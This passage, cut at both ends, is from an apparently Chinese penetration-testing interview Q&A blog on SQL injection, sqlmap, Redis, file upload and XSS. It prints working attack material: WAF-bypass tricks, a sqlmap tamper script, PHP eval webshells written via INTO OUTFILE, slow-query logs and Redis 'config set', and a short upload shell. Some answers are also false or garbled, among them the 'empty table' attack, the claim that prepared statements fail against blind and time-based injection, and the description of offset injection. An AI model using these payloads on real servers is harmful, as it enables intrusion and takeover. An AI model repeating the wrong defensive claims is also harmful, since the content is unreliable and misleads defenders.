<code>?id=1&amp;id=2</code> , 部分WAF在处理的过程中可能只处理前面提交的参数值，而后端程序在处理的时候可能取的是最后的值）<br>(10) 添加%绕过过滤（将WAF中过滤的敏感字符通过添加%绕过过滤。如 sel%ect）<br>(11) 协议未覆盖绕过（部分WAF可能只对一种content-type类型增加了检测规则，可以尝试互相替换去掉WAF过滤机制。）<br>(12) 宽字节绕过（宽字节注入是因为使用了GBK编码。）<br>(13) %00截断<br>(14) Cookie&#x2F;X-Forwarded-For注入绕过（部分WAF可能只对GET，POST提交的参数进行过滤，未对Cookie或者X-Forwarded-For进行检测，可通过cookie或者X-Forwarded-For提交注入参数语句进行绕过。）<br>(15) 利用pipline绕过（当请求中的Connection字段值为keep-alive，则代表本次发起的请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止。部分WAF可能只对第一次传输过来的请求进行过滤处理。）<br>(16) 利用分块编码传输绕过（分块传输编码是HTTP的一种数据传输机制，允许将消息体分成若干块进行发送。当数据请求包中header信息存在Transfer-Encoding: chunked，就代表这个消息体采用了分块编码传输。）<br>(17) 冷门函数&#x2F;字符&#x2F;运算符绕过（如： Sleep()  &#x3D;&#x3D;&gt; benchmark()）</p><p><a href="https://www.freebuf.com/articles/web/229982.html">WAF机制及绕过方法总结：注入篇</a></p><ol start="21"><li>有没有写过sqlmap tamper？</li></ol><p>写过。<br>使用方式：将所写的tamper，如 <code>xx.py</code> 放入 <code>sqlmap\tamper</code> 路径下，然后使用的时候加上参数 <code>--tamper=xx</code> 即可。<br>PRIORITY: 定义tamper的优先级（LOWEST&#x3D;-100, LOWER&#x3D;-50, LOW&#x3D;-10, NORMAL&#x3D;0, HIGH&#x3D;10, HIGHER&#x3D;50, HIGHEST&#x3D;100）<br>dependencies(): 提示用户tamper支持哪些数据库<br>tamper(): 实现的功能全部在该函数里。要实现绕过一般是针对payload修改。<br>注释混淆，绕安全狗。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.settings <span class="keyword">import</span> UNICODE_ENCODING</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload = payload.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/*/!%!/*/&quot;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&quot;()&quot;</span>,<span class="string">&quot;(/*/!%!/*/)&quot;</span>)</span><br><span class="line">        payload = re.sub(<span class="string">r&quot;(?i)(INFORMATION_SCHEMA.SCHEMATA)&quot;</span>,<span class="string">r&quot;/*!00000--%20/*%/%0aINFORMATION_SCHEMA.SCHEMATA*/&quot;</span>,payload)</span><br><span class="line">        payload = re.sub(<span class="string">r&quot;(?i)(INFORMATION_SCHEMA.TABLES)&quot;</span>,<span class="string">r&quot;/*!00000--%20/*%/%0aINFORMATION_SCHEMA.TABLES*/&quot;</span>,payload)</span><br><span class="line">        payload = re.sub(<span class="string">r&quot;(?i)(INFORMATION_SCHEMA.COLUMNS)&quot;</span>,<span class="string">r&quot;/*!00000--%20/*%/%0aINFORMATION_SCHEMA.COLUMNS*/&quot;</span>,payload)</span><br><span class="line">        payload = re.sub(<span class="string">r&quot;(?i)(/AS/)&quot;</span>,<span class="string">r&quot;//*!00000--%20/*%/%0aAS*//&quot;</span>,payload)        </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p><a href="https://www.secpulse.com/archives/196598.html">参考资料</a></p><ol start="22"><li>为什么参数化查询可以防止SQL注入？</li></ol><p>参数化查询是指在设计与数据库连接并访问数据时，在需要填入数值或数据的地方，使用参数（Parameter）来给值。<br>在使用参数化查询的情况下，数据库服务器不会将参数的内容视为SQL语句的一部分来进行处理，而是在数据库完成SQL语句的编译之后，才套用参数执行。因此就算参数中含有破坏性指令，也不会被数据库执行。<br><a href="https://worktile.com/kb/ask/35126.html">如何从根本上防止 SQL 注入</a></p><ol start="23"><li>盲注是什么？怎么盲注？</li></ol><p>在服务器没有错误回显的时候完成的注入攻击。盲注分为布尔盲注和时间盲注。<br>盲注可以通过手工，burp或sqlmap。<br>手工：首先判断注入点，然后判断当前页面字段数，再判断显示位，之后是猜解当前数据库名长度，用ASCII码猜解当前数据库名，最后猜表名猜字段名猜内容。</p><ol start="24"><li>宽字节注入原理以及根本原因</li></ol><p>原理：见问题4<br>根本原因：设置数据库编码与PHP编码设置为不同的两个编码格式从而导致产生宽字节注入</p><ol start="25"><li>sql如何写shell&#x2F;单引被过滤怎么办？SQL注入写shell（MySQL &amp; mssql &amp; oracle）sql注入如何拿getshell？sql注入，写shell的语句，除了into outfile还有什么MySQL的特性可以getshell</li></ol><p>sql写shell的前提条件：<br>1 需要知道网站的绝对路径<br>2 secure_file_priv的值为空<br>3 需要足够的权限<br>4 GPC关闭可使用单引号</p><p>sql写shell的方式：<br>(1) 导出函数写shell</p><ul><li>into outfile直接写。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,&quot;&lt;?php @eval($_POST[&#x27;c&#x27;]);?&gt;&quot; into outfile &quot;C:/phpstudy/WWW/shell.php&quot;#</span><br></pre></td></tr></table></figure></li><li>shell HEX编码<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,0x3C3F70687020406576616C28245F504F53545B2763275D293B3F3E into outfile &quot;C:/phpStudy/WWW/shell.php&quot;#</span><br></pre></td></tr></table></figure></li></ul><p>(2) 日志写shell<br>① 开启慢查询日志并修改日志为网站路径下的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;; set global slow_query_log=1;set global slow_query_log_file=&#x27;C:/phpstudy/WWW/logshell.php&#x27;;#</span><br></pre></td></tr></table></figure><p>② 执行包含shell的查询语句并使用sleep(11)让语句记录进慢查询日志脚本。连接成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;;select &quot;&lt;?php eval($_POST[log]);?&gt;&quot; from users where sleep(11)#</span><br></pre></td></tr></table></figure><p>(3) 读文件函数写文件<br>① <code>load_file()</code><br>② <code>?id=-1&#39;union select 1,load_file(&#39;C:/phpstudy/WWW/readme.txt&#39;);#</code></p><p>单引号被过滤了怎么办？<br>16进制，ASCII编码，url编码，尝试用双引号或反斜杠代替</p><ol start="26"><li>sql注入点，空表如何利用</li></ol><p>攻击者可以利用空表绕过服务器的过滤。<br>空表攻击的原理：利用空表名作为参数，在查询语句中执行任意SQL语句。如: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `#` WHERE `id` = 1</span><br></pre></td></tr></table></figure><p>具体的防范措施：</p><ul><li>在参数中使用双引号而不是单引号，这样可以避免单引号被转义。</li><li>使用函数来处理参数，例如 trim()、rtrim() 和 ltrim() 等函数，可以帮助去除参数中的空格和其他特殊字符。</li><li>使用正则表达式来验证参数的格式，可以帮助检测和阻止恶意参数。</li></ul><ol start="27"><li>怎样判断是否存在注入</li></ol><p>手工测试，使用工具(sqlmap)，使用安全扫描(Nessus)<br>单引号检测，空格检测，特殊字符检测(; # *等)，逻辑运算符检测(and or等)</p><ol start="28"><li>sql注入无回显怎么办？</li></ol><p>通过dnslog或httplog外带</p><ol start="29"><li>延时注入除了sleep的其它姿势(mysql)</li></ol><p>benchmark()函数</p><ol start="30"><li>DNSlog原理</li></ol><p>DNSlog是DNS的日志，存储在DNS服务器上的域名信息，记录着用户对域名的访问信息，类似日志文件。<br>DNSlog是解析日志，DNS分为三级域名，域名不分大小写，所以利用解析的日志把攻击者需要的值带出，称为数据外带，原理上只要能进行DNS请求的函数都可能存在DNSlog注入。</p><ol start="31"><li>sql注入，写shell的语句，除了into outfile还有什么MySQL的特性可以getshell</li></ol><p>见问题25</p><ol start="32"><li>redis的利用，如何shell，相关命令</li></ol><p>写ssh-keygen公钥登录服务器，利用计划任务反弹shell<br>写shell见问题36</p><ol start="33"><li>sql注入原理，及常用payload（手写-爆表名）</li></ol><p>SQL注入是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p><ol start="34"><li>sql注入空格不能使用如何绕过？</li></ol><p>使用括号绕过，使用 <code>tab %0a /**/</code> 代替</p><ol start="35"><li>sql注入防御，延伸预处理不能预防哪些注入？</li></ol><p>基于盲注的注入（盲注是指攻击者通过向数据库发送一系列的SQL语句来判断数据库中是否存在特定数据。攻击者可将参数值设置为特殊的字符串，例如%或_，以绕过数据库的参数化处理）<br>基于时间延迟的注入（基于时间延迟的注入是指攻击者通过向数据库发送一系列的SQL语句来延迟数据库的响应时间，以判断数据库中是否存在特定数据。在这种情况下，攻击者可以将参数值设置为会导致数据库执行大量计算的语句，以延迟数据库的响应时间。）<br>基于错误信息的注入（基于错误信息的注入是指攻击者通过向数据库发送一系列的SQL语句来获取数据库的错误信息，以判断数据库中是否存在特定数据。在这种情况下，攻击者可以将参数值设置为会导致数据库抛出异常的语句，以获取数据库的错误信息。）</p><ol start="36"><li>攻击redis的方式（手写payload）</li></ol><p>常见攻击redis的方式有：未授权访问、命令注入、缓存溢出、远程代码执行、数据泄露<br>payload示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h ip -p port    <span class="comment"># redis远程连接</span></span><br><span class="line">ip:port&gt; info              <span class="comment"># 列出信息</span></span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html </span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\r\n\r\n&lt;?php eval(<span class="variable">$_POST</span>[whoami]);?&gt;\r\n\r\n&quot;</span></span><br><span class="line"><span class="comment"># 用redis写入文件的会自带一些版本信息，如果不换行可能导致无法执行</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><ol start="37"><li>SQL注入写shell（MySQL &amp; mssql &amp; oracle）sql注入如何拿getshell</li></ol><p>见问题25<br><a href="http://www.kryst4l.cn/2022/09/05/Oracle%E5%92%8Cmssql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%99shell/">Oracle和mssql数据库写shell</a></p><ol start="38"><li>SQL注入后利用</li></ol><p>获取数据库信息，修改数据库数据，删除数据库数据，执行任意操作</p><ol start="39"><li>redis的利用</li></ol><p>见问题32</p><ol start="40"><li>常见的sql注入类型有哪些？并写出sqlmap检测sql注入的命令？sqlmap api怎么使用？</li></ol><p>sql注入类型：联合注入，报错注入，布尔盲注，时间盲注，二次注入，宽字节注入，堆叠注入<br>sqlmap检测sql注入的命令：<br><code>python sqlmap.py -u http://xxx.xxx.xxx.xxx/abc/qwe/?id=1 --dbs --batch</code><br>sqlmap api使用方式：<br>首先在本地启动sqlmap服务器： <code>python sqlmapapi.py -s</code> 将在localhost端口8000运行。(服务端和客户端不在同一台主机上会连接不上)<br>通过该命令开启api服务端： <code>python sqlmapapi.py -s -H &quot;0.0.0.0&quot; -p 8775</code><br>命令成功后，远程客户端可通过指定远程主机IP和端口来连接API服务端</p><p>需要固定 admin token, 修改sqlmap目录下的 <code>/lib/utils/api.py</code> 文件，以下是源代码：<br><code>DataStore.admin_token = encodeHex(os.urandom(16), binary=False)</code></p><p>使用GET请求 <code>new -u &quot;http://192.168.1.1/dvwa/vulnerabilities/sqli/?id=2&amp;submit=Submit&quot;</code><br>创建一个新的扫描任务</p><p>使用POST请求 <code>new -r C:\Users\abc\sql\build1\test.txt</code><br>发送JSON数据到 <code>http://localhost:8000/scan/start</code><br>JSON数据的格式如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://example.com&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;id&quot;</span><span class="punctuation">,</span> <span class="string">&quot;username&quot;</span><span class="punctuation">,</span> <span class="string">&quot;password&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="comment">// url 是目标URL，parameters是需要测试注入的参数。</span></span><br></pre></td></tr></table></figure><p>sqlmap将返回一个JSON数据，其中包含扫描结果，扫描结果的格式如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;running&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;taskid&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;results&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="comment">// status表示扫描状态，taskid是任务id，results是扫描结果</span></span><br><span class="line"><span class="comment">// 扫描完成后，status将变成terminated, results将包含扫描结果</span></span><br></pre></td></tr></table></figure><p>可以通过以下命令获取任务状态(其中 1 是任务id)：<br><code>curl http://localhost:8000/scan/status/1</code><br>可通过以下命令获取所有任务id：<br><code>curl http://localhost:8000/scan/status/ids</code></p><p>基于HTTP协议的接口模式：<br><code>@get(&quot;/task/new&quot;)</code> 新建任务，返回一个随机的taskid<br><code>@get(&quot;/task//delete&quot;)</code> 删除任务，调用时指定taskid<br><code>@get(&quot;/admin/list&quot;)</code> 获取taskid</p><ol start="41"><li>针对sql注入，写出你所知道的bypass waf的可能方式</li></ol><p>见问题20</p><ol start="42"><li>sql注入漏洞如何修复？</li></ol><p>预处理。使用参数化查询。过滤用户输入。使用安全编码实践。配置MySQL临时日志查看SQL语句。</p><ol start="43"><li>数据库预处理怎么突破？SQL预处理绕过 数据库预处理绕过</li></ol><p>1、使用字符串拼接。攻击者可以将用户输入的数据作为字符串拼接到SQL语句中，从而绕过预编译的安全机制。<br>2、使用函数或存储过程。攻击者可以使用函数或存储过程来执行OS命令，从而绕过预编译的安全机制。<br>3、错误处理不当。攻击者可以构造恶意的输入来触发SQL语法错误，从而绕过预编译的安全机制。<br><a href="https://xz.aliyun.com/t/10594">SQL注入之Mysql注入姿势及绕过总结</a></p><ol start="44"><li>sql注入如何拿getshell</li></ol><p>见问题37</p><ol start="45"><li>sqlmap怎么跑post请求</li></ol><p>方式一：burp抓包，保存为txt格式文件，放在目录下。<br><code>python sqlmap.py -r &quot;dialog/xx.txt&quot; -p n --dbs</code></p><p>方式二：自动搜索表单的方式<br><code>python sqlmap.py -u &quot;http://example.com/index.php&quot; --forms</code></p><p>方式三：指定一个参数的方法<br><code>python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-11/index.php --data &quot;uname=1&amp;passwd=11&amp;submit=Submit&quot; --dbs --batch   爆破所有数据库</code></p><ol start="46"><li>sql注入怎么拿到最高权限？</li></ol><p>见问题37</p><ol start="47"><li>怎么利用sql注入来读取文件</li></ol><p>MySQL读文件:<br><code>load_file(&#39;c:/boot.ini&#39;)</code><br>sqlmap的方式：<br><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-2/?id=1&quot; --file-read &quot;D:/test.txt&quot;</code><br>SQL Server 读文件: </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">result</span>(res <span class="type">varchar</span>(<span class="number">8000</span>));</span><br><span class="line">bulk <span class="keyword">insert</span> <span class="keyword">result</span> <span class="keyword">from</span> <span class="string">&#x27;d:/1.txt&#x27;</span>; # BULK <span class="keyword">INSERT</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 开启CLR集成</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">reconfigure;</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;clr_enabled&#x27;</span>,<span class="number">1</span></span><br><span class="line">reconfigure</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> master.dbo.fn_varbintohexstr(<span class="built_in">cast</span>(content <span class="keyword">as</span> <span class="type">varbinary</span>)) <span class="keyword">from</span> sys.assembly_files  # 读取方式</span><br><span class="line"><span class="keyword">create</span> assembly sqb <span class="keyword">from</span> <span class="string">&#x27;d:\net.exe&#x27;</span>;</span><br><span class="line"><span class="keyword">alter</span> assembly sqb <span class="keyword">add</span> file <span class="keyword">from</span> <span class="string">&#x27;d:\1.txt&#x27;</span></span><br><span class="line"><span class="keyword">alter</span> assembly sqb <span class="keyword">add</span> file <span class="keyword">from</span> <span class="string">&#x27;d:\notnet.exe&#x27;</span></span><br></pre></td></tr></table></figure><ol start="48"><li>注入攻击原理是什么？如何找注入点？如何判断注入点？</li></ol><p>注入攻击原理：见问题33<br>如何判断如何找注入点：见问题1，8，27</p><ol start="49"><li>注入分为几类，提交方式是什么？</li></ol><p>见问题2</p><ol start="50"><li>注入攻击一般所支持的类型有哪些？</li></ol><p>见问题49</p><ol start="51"><li>sql注入对服务器文件读写操作需要哪些条件？</li></ol><p>当前用户权限对该文件可读，<br>文件在服务器上，<br>路径完整，<br>文件按大小小于max_allowed_packet，<br>当前数据库用户有FILE权限，file_priv为yes，<br>secure_file_priv的值为空，如果值为某目录，那么就只能对该目录的文件进行操作。</p><ol start="52"><li>分别说出sqlmap -u -r -v -p  –level –risk –tables –columns -T –tamper参数的含义</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-u  URL，指定目标url</span><br><span class="line">-r  REQUESTFILE，从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，</span><br><span class="line">这样就可以跳过设置一些其它参数（比如cookie，post数据等），</span><br><span class="line">请求是HTTPS的时候需要配合这个--force-ssl参数来使用，或者可以在HOST头后门加上443</span><br><span class="line">-v  VERBOSE，信息级别：0-6。</span><br><span class="line">其值具体含义：“0”只显示python错误以及严重的信息；</span><br><span class="line">1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；</span><br><span class="line">“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；</span><br><span class="line">“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。</span><br><span class="line">-p  TESTPARAMETER，可测试的参数</span><br><span class="line">--level  LEVEL，执行测试的等级（1-5，默认为1）</span><br><span class="line">--risk  RISK，执行测试的风险（0-3，默认为1）</span><br><span class="line">--tables  枚举DBMS数据库中的表</span><br><span class="line">--columns  枚举DBMS数据库中表的列名</span><br><span class="line">-T  指定数据库中的表</span><br><span class="line">--tamper  使用给定的脚本篡改注入数据</span><br></pre></td></tr></table></figure><ol start="53"><li>注入漏洞防范方法</li></ol><p>见问题2</p><ol start="54"><li>MySQL数据库的右向偏移</li></ol><p>偏移注入是一种利用MySQL中的字符串截断漏洞来获取敏感信息的攻击方式。<br>攻击者通过在注入语句中插入特殊字符，将字符串截断到指定位置，从而获取该位置的数据。</p><p>偏移注入的攻击原理如下：<br>攻击者首先通过猜测表名和字段名，构造一个SQL注入语句。<br>在注入语句中插入特殊字符，将字符串截断到指定位置。<br>通过查询数据库，获取截断位置的数据。</p><p>偏移注入的攻击方式主要有两种：<br>字符串截断：攻击者通过在注入语句中插入特殊字符，将字符串截断到指定位置。<br>字符编码：攻击者通过在注入语句中插入特殊字符，将字符编码成指定格式，从而获取该格式的数据。</p><p>偏移注入的防范措施主要有以下几点：<br>使用严格模式：MySQL的严格模式可以防止字符串截断漏洞，因此建议使用严格模式。<br>过滤特殊字符：在输入数据中过滤特殊字符，可以防止攻击者利用这些字符进行注入攻击。<br>使用安全的编码方式：使用安全的编码方式，可以防止攻击者利用编码漏洞进行注入攻击。</p><ol start="55"><li>sqlserver利用思路</li></ol><p>(1) 危险存储过程利用<br>(2) COM组件利用<br>(3) SQL server CLR利用<br>(4) SQL Server Agent Job代理执行计划任务利用<br>(5) SQL Server R和Python的利用<br><a href="https://xz.aliyun.com/t/10955">从0开始学习Microsoft SQL Server数据库攻防</a></p><ol start="56"><li>偏移注入</li></ol><p>见问题54</p><ol start="57"><li>说说sql注入手工怎么爆出所有库名字</li></ol><p>爆当前库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata</span></span><br></pre></td></tr></table></figure><p>爆所有库<br><code>show databases;</code><br><code>select * from information_schema.SCHEMATA</code><br><code>id=1&#39; union select 1,schema_name from information_schema.SCHEMATA</code></p><ol start="58"><li>数据库表名test，字段名user，password写出查询语句。</li></ol><p><code>?id=1&#39; union select group_concat(user,password) from test--+</code></p><ol start="59"><li>是否有写过tamper</li></ol><p>见问题21</p><ol start="60"><li>如何彻底杜绝SQL注入？</li></ol><p>见问题2</p><ol start="61"><li>SQL注入，如果注入点在union或order by之后，怎么办？</li></ol><p>使用堆叠注入？</p><ol start="62"><li><p>sqlmap原理<br>通过构造恶意的SQL查询语句，利用应用程序的漏洞来执行SQL注入攻击。<br>联合注入，报错注入，布尔盲注，时间盲注，堆叠注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-u  URL，指定目标url</span><br><span class="line">-r  REQUESTFILE，从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，</span><br><span class="line">这样就可以跳过设置一些其它参数（比如cookie，post数据等），</span><br><span class="line">请求是HTTPS的时候需要配合这个--force-ssl参数来使用，或者可以在HOST头后门加上443</span><br><span class="line">-v  VERBOSE，信息级别：0-6。</span><br><span class="line">其值具体含义：“0”只显示python错误以及严重的信息；</span><br><span class="line">1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；</span><br><span class="line">“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；</span><br><span class="line">“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。</span><br><span class="line">-p  TESTPARAMETER，可测试的参数</span><br><span class="line">--level  LEVEL，执行测试的等级（1-5，默认为1）</span><br><span class="line">--risk  RISK，执行测试的风险（0-3，默认为1）</span><br><span class="line">--tables  枚举DBMS数据库中的表</span><br><span class="line">--columns  枚举DBMS数据库中表的列名</span><br><span class="line">-T  指定数据库中的表</span><br><span class="line">--tamper  使用给定的脚本篡改注入数据</span><br></pre></td></tr></table></figure></li><li><p>order by注入 limit注入 后面跟的函数有什么不同<br>limit注入只存在低于MySQL 5.5的版本中；<br>limit注入后跟的函数: <code>PROCEDURE ANALYSE</code><br>order by注入后跟的函数: <code>if</code></p></li><li><p>order by含义<br>order by是mysql中对查询数据进行排序的方法。默认升序(aes)，也可降序(desc)</p></li><li><p>过滤了单引号into outfile还能用吗？<br>不能，GPC要off才行，可以测试Hex编码</p></li></ol><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><ol><li>文件上传有哪些防护方式？</li></ol><p>(1) 文件上传目录设置为不可执行：最有效。Linux撤销’x’权限，放置在独立存储上作为静态文件。缓存加速，杜绝脚本执行。<br>(2) 判断文件类型：MIME Type、后缀检查等方式。类型检查用白名单。图片用压缩函数或resize函数。<br>(3) 用随机数改写文件名和文件路径：无法得知文件名和路径就难以攻击。类似于shell.php.rar和crossdomain.xml会因重命名而无法攻击。<br>(4) 单独设置文件服务器的域名：浏览器同源策略一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。<br>(5) 限制用户上传文件的类型：指定格式和后缀名，上传后对文件后缀名进行校验，防止攻击者双后缀名绕过。<br>(6) 使用安全的文件上传组件：比如WebUploader, plupload, FineUploader。</p><ol start="2"><li>文件上传白名单利用</li></ol><p>文件包含图片马，文件包含日志，包含SESSION，00截断，文件解析漏洞，.user.ini，.htaccess</p><ol start="3"><li>文件上传点，黑名单限制，如何利用</li></ol><p>上传不常见的PHP扩展名来绕过黑名单（pht, phpt, phtml, php3, php4, php5, php6）<br>文件名过滤时忽略了大小写（pHp,Php,phP）<br>解析漏洞（Apache和IIS解析漏洞）</p><ol start="4"><li>文件上传怎么绕过</li></ol><p>前端客户端过滤绕过：关闭JS脚本<br>基于黑名单的文件名过滤绕过：1. 上传不常见的PHP扩展名来绕过黑名单。 2. 文件名过滤忽略大小写 3. 解析漏洞<br>基于白名单的文件名过滤绕过：1. 空字节注入。 2. 双写扩展名  3. .user.ini  4. .htaccess<br>Content-Type过滤：使用burp截断修改content-type<br>文件头过滤：加上图片文件头<br>二次渲染：通过PHP GD库来创建一张含有木马的图片能绕过服务器的二次渲染<br>超短shell： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`$_GET[x]`?&gt;</span><br></pre></td></tr></table></figure><ol start="5"><li>任意文件上传漏洞分几类，说出每类突破方法</li></ol><p>文件类型过滤漏洞：服务器端对文件上传的文件类型进行过滤，但过滤规则不严谨，导致攻击者可以上传恶意文件。例如：修改后缀绕过过滤。<br>文件名过滤漏洞：服务器端对上传的文件名进行过滤，但过滤规则不严谨，导致攻击者可以上传恶意文件。例如：攻击者在恶意脚本的文件名加入特殊字符，绕过过滤。<br>目录穿越漏洞：攻击者可以利用目录穿越漏洞，将恶意文件上传到服务器的敏感目录下。例如：将恶意脚本文件的文件名加入..&#x2F; ,从而将恶意脚本文件上传到上级目录下。<br>文件解析漏洞：服务器端在解析上传的文件时存在漏洞，导致攻击者可以利用该漏洞执行恶意代码。例如，服务器端在解析图片文件时存在漏洞，攻击者可以将恶意脚本文件嵌入到图片文件中，从而执行恶意代码。</p><ol start="6"><li>上传的木马被当成图片解析或不解析怎么办？<br>通过上传自定义文件.user.ini，使php去读取其内容，将指定文件包含在一个正常的php文件中，进行解析，从而达到getshell的结果。该方法用在文件上传，.user.ini可以上传成功，且在上传目录下存在一个正常的php文件即可。可以在php文件无法正常上传,不存在文件包含漏洞,图片马上传之后无法解析的情况下进行。</li></ol><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><ol><li>XSS能用来做什么？</li></ol><p>盗取各类用户账号<br>控制企业数据<br>盗窃企业重要资料<br>非法转账<br>强制发送电子邮件<br>网站挂马控制受害者及其向其它网站发起攻击<br>刷流量，执行弹窗广告</p><ol 